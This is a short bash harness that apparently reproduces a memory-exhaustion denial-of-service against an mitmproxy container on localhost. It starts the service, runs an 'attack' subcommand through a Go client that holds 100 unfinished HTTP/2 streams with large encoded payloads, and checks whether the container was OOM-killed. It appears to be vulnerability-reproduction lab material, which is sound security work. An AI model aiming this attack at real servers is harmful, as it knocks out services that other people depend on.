#!/usr/bin/env bash
set -u

DIR="$(cd "$(dirname "$0")" && pwd)"
COMPOSE=(docker compose -f "$DIR/docker-compose.yml")
PORT="${PORT:-8087}"
CONTAINER="${CONTAINER:-ha-mitmproxy}"
CERTS="$DIR/certs"

state() {
    if docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
        echo "server: ALIVE $(docker stats --no-stream --format '{{.MemUsage}}' "$CONTAINER" 2>/dev/null)"
    else
        echo "server: DOWN oom=$(docker inspect "$CONTAINER" --format '{{.State.OOMKilled}}' 2>/dev/null) exit=$(docker inspect "$CONTAINER" --format '{{.State.ExitCode}}' 2>/dev/null)"
    fi
}

certs() {
    [ -f "$CERTS/combined.pem" ] && return
    mkdir -p "$CERTS"
    openssl req -x509 -newkey rsa:2048 -keyout "$CERTS/key.pem" -out "$CERTS/cert.pem" \
        -days 365 -nodes -subj /CN=localhost 2>/dev/null
    cat "$CERTS/cert.pem" "$CERTS/key.pem" > "$CERTS/combined.pem"
}

case "${1:-}" in
    start)  certs; "${COMPOSE[@]}" up -d; sleep 30; state ;;
    attack) (cd "$DIR/client" && go run . -target "127.0.0.1:${PORT}" -authority localhost -conns 1 -streams 100 \
                -max-encoded-size 6000000 -no-fin -hold 30s) ;;
    status) state; docker logs --tail 3 "$CONTAINER" 2>&1 ;;
    logs)   docker logs -f "$CONTAINER" ;;
    stop)   "${COMPOSE[@]}" down --remove-orphans ;;
    *)      echo "usage: ./run.sh {start|attack|status|logs|stop}" ;;
esac
